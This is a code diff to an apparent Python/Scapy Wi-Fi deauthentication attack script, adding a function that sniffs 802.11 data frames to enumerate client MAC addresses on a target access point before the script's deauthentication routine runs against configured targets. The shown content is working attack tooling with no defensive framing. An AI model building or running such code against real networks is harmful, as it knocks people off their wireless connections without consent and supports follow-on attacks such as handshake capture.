@@ -57,6 +57,55 @@ def set_channel(interface, channel):
     except subprocess.CalledProcessError as e:
         logging.error(f"Failed to set channel {channel}: {e}")
 
+def monitor_clients(interface, target_ssid, target_bssid, channels, duration):
+    logging.info(f"Monitoring clients for {target_ssid} ({target_bssid}) for {duration} seconds")
+    discovered_clients = set()
+
+    def packet_handler(pkt):
+        if pkt.haslayer(Dot11):
+            # Check for data frames to/from the target AP
+            if pkt.type == 2:  # Data frame
+                bssid = None
+                client = None
+
+                # Determine BSSID and client based on frame direction
+                if pkt.addr1.lower() == target_bssid.lower():
+                    bssid = pkt.addr1
+                    client = pkt.addr2
+                elif pkt.addr2.lower() == target_bssid.lower():
+                    bssid = pkt.addr2
+                    client = pkt.addr1
+                elif pkt.addr3.lower() == target_bssid.lower():
+                    bssid = pkt.addr3
+                    # addr1 or addr2 could be client, prioritize addr1
+                    client = pkt.addr1 if pkt.addr1.lower() != target_bssid.lower() else pkt.addr2
+
+                if bssid and client and client.lower() not in [target_bssid.lower(), 'ff:ff:ff:ff:ff:ff']:
+                    if client.lower() not in discovered_clients:
+                        discovered_clients.add(client.lower())
+                        logging.info(f"Discovered client: {client.upper()} connected to {target_ssid}")
+
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        for channel in channels:
+            set_channel(interface, channel)
+            remaining = end_time - time.time()
+            if remaining <= 0:
+                break
+            sniff_time = min(remaining / len(channels), 2)  # Distribute time across channels
+            try:
+                sniff(iface=interface, prn=packet_handler, timeout=sniff_time, store=False)
+            except Exception as e:
+                logging.error(f"Error while monitoring on channel {channel}: {e}")
+
+    logging.info(f"Monitoring complete. Total clients discovered: {len(discovered_clients)}")
+    if discovered_clients:
+        logging.info(f"Client list: {', '.join([c.upper() for c in discovered_clients])}")
+    else:
+        logging.info("No clients detected during monitoring period")
+
+    return list(discovered_clients)
+
 def deauth_clients(interface, bssid, duration, channels):
     logging.info(f"Deauthenticating clients on BSSID: {bssid} for {duration} seconds on channels: {channels}")
     end_time = time.time() + duration
@@ -70,20 +119,25 @@ def deauth_clients(interface, bssid, duration, channels):
 def main():
     config = load_config('deauth.json')
     setup_logging(config)
-    
+
     logging.info("Starting deauthentication script")
     interface = config['interface']
     verify_timeout = config['verify_timeout']
     max_retries = config['max_retries']
+    monitor_duration = config['monitor_duration']
     logging.debug(f"Using interface: {interface}")
 
     for target in config['targets']:
         active_channels = verify_ap_presence(interface, target['ssid'], target['bssid'], target['channels'], verify_timeout, max_retries)
         if active_channels:
+            # Monitor for clients before deauth
+            clients = monitor_clients(interface, target['ssid'], target['bssid'], active_channels, monitor_duration)
+
+            # Proceed with deauth
             deauth_clients(interface, target['bssid'], config['deauth_duration'], active_channels)
         else:
             logging.warning(f"{target['ssid']} ({target['bssid']}) is not active on any specified channel")
-    
+
     logging.info("Deauthentication script completed")
 
 if __name__ == "__main__":
